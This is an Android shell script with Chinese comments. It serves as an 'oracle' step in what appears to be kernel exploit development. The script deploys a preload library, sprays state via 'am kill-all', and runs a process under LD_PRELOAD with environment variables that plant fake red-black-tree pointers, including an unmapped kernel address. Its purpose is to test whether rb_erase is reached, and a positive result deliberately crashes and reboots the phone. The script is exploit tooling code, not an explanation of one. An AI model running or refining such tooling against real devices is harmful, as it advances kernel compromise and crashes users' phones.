#!/system/bin/sh
# mt18 oracle: 判别 [7] rb_erase 是否执行
# PSELECT_TREE_PC = 未映射地址 (0xffffffb0fffffff8, 超出 12GB RAM 线性映射)
#   → 若 walk 到达 [7] 且 rb_erase 写/读该地址 → 内核 oops/重启 (判别阳性)
#   → 若没崩 → walk 在 [7] 之前退出 (判别阴性)
# 注意: 阳性会重启手机 (mrdump/ipanic), 需用户确认后运行
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt18_diag.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt18_diag.txt

echo "=== [1/4] 部署 ==="
rm -f $DST; cp $SRC $DST; sync
SRC_H=$(sha256sum $SRC | awk '{print $1}')
DST_H=$(sha256sum $DST | awk '{print $1}')
[ "$SRC_H" = "$DST_H" ] || { echo "HASH MISMATCH"; exit 1; }
echo "HASH OK"

echo "=== [2.5] am kill-all (restore spray cache) ==="
am kill-all 2>&1 | tail -1

echo "=== [3/4] boot_id 前 ==="
cat /proc/sys/kernel/random/boot_id | tee $LOG

echo "=== [4/4] 运行 (oracle: tree_pc=未映射, ONE_SHOT, shift=0) ==="
PSELECT_TREE_PC=ffffffb0fffffff8 \
PSELECT_TREE_RIGHT=0 \
PSELECT_TREE_LEFT=0 \
PSELECT_PI_PARENT=0 \
PSELECT_PI_RIGHT=0 \
PSELECT_PI_LEFT=0 \
PSELECT_PAT_C0=1 \
PSELECT_ONE_SHOT=1 \
PSELECT_SHIFT=0 \
PSELECT_SKIP_WARMUP=1 \
LD_PRELOAD=$DST /system/bin/sleep 45 2>&1 | tee -a $LOG
RC=$?
echo "run_rc=$RC (若为负数/超时 → 可能已崩溃重启)" | tee -a $LOG

echo "=== [5/4] boot_id 后 ==="
cat /proc/sys/kernel/random/boot_id 2>/dev/null | tee -a $LOG
echo "=== DONE ==="
